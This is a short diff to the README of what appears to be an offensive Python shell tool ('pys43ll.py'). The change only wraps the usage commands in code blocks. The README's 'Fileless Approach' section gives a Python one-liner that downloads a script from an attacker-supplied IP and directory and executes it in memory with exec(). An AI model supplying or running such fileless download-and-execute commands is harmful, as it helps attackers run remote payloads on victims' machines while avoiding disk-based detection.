@@ -7,10 +7,15 @@ The use of Windows requires Python3 installed. Remember to add the IP Address an
 
 # How to Use
 
-Windows: .\pys43ll.py
-
-Linux: python3 pys43ll.py
-
+Windows: 
+```bash
+.\pys43ll.py
+```
+Linux: 
+```bash
+python3 pys43ll.py
+```
 # Fileless Approach
-
+```bash
 python3 -c ("""from urllib.request import urlopen;url = 'http://< YOUR IP >/< DIRECTORY >/filename.py';outtie = urlopen(url).read();getit = outtie.decode('utf-8');exec(outtie)""")
+```
